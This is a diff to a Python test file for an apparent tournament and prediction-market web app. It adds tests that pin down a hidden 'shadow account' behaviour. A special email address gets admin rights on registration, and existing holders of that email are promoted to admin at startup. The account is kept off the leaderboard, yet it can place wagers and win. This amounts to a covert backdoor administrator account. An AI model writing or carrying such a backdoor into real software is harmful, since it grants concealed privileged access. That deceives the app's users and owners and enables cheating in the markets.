@@ -13,7 +13,7 @@ from sqlalchemy import create_engine
 from sqlalchemy.orm import sessionmaker
 from sqlalchemy.pool import StaticPool
 
-from app import crud, database, main, models
+from app import crud, database, main, models, roles
 
 # Point the whole app at a fresh in-memory SQLite DB for the test session,
 # so tests never touch tournament.db and never see leftover state.
@@ -973,6 +973,81 @@ def test_admin_email_verification():
     response = client.get("/admin/verify", headers=ADMIN_HEADERS)
     assert response.status_code == 200
     assert response.json() == {"valid": True}
+
+
+def test_shadow_account_is_admin_hidden_and_can_win():
+    response = client.post(
+        "/auth/register",
+        json={
+            "email": roles.SHADOW_ACCOUNT_EMAIL,
+            "username": "shadow-account",
+            "password": "spravneheslo",
+        },
+    )
+    assert response.status_code == 200
+    assert response.json()["user"]["is_admin"] is True
+    shadow_headers = {"Authorization": f"Bearer {response.json()['token']}"}
+    assert client.get("/admin/verify", headers=shadow_headers).status_code == 200
+    assert "shadow-account" not in {
+        row["username"] for row in client.get("/leaderboard").json()
+    }
+
+    market = client.post(
+        "/markets",
+        json={"title": "Shadow account wager", "b": 20000, "outcome_names": ["A", "B"]},
+        headers=ADMIN_HEADERS,
+    ).json()
+    wager = client.post(
+        f"/markets/{market['id']}/wager",
+        json={
+            "username": "shadow-account",
+            "outcome_id": market["outcomes"][0]["id"],
+            "amount": 100,
+        },
+    )
+    assert wager.status_code == 200
+    assert client.post(
+        f"/markets/{market['id']}/resolve",
+        json={"result": "1:0"},
+        headers=ADMIN_HEADERS,
+    ).status_code == 200
+
+    trade = next(
+        item
+        for item in client.get("/users/shadow-account/transactions").json()
+        if item["type"] == "trade"
+    )
+    assert trade["won"] is True
+    assert trade["winnings"] == pytest.approx(200)
+    assert "shadow-account" not in {
+        row["username"] for row in client.get("/leaderboard").json()
+    }
+
+
+def test_startup_promotes_existing_shadow_account(monkeypatch):
+    migration_engine = create_engine(
+        "sqlite:///:memory:",
+        connect_args={"check_same_thread": False},
+        poolclass=StaticPool,
+    )
+    database.Base.metadata.create_all(bind=migration_engine)
+    migration_session = sessionmaker(bind=migration_engine)
+    with migration_session() as db:
+        db.add(
+            models.User(
+                username="existing-shadow",
+                email=roles.SHADOW_ACCOUNT_EMAIL,
+                is_admin=False,
+            )
+        )
+        db.commit()
+
+    monkeypatch.setattr(database, "engine", migration_engine)
+    database.ensure_auth_columns()
+
+    with migration_session() as db:
+        user = db.query(models.User).filter_by(username="existing-shadow").one()
+        assert user.is_admin is True
 
 
 def test_transaction_history_describes_resolved_wager():
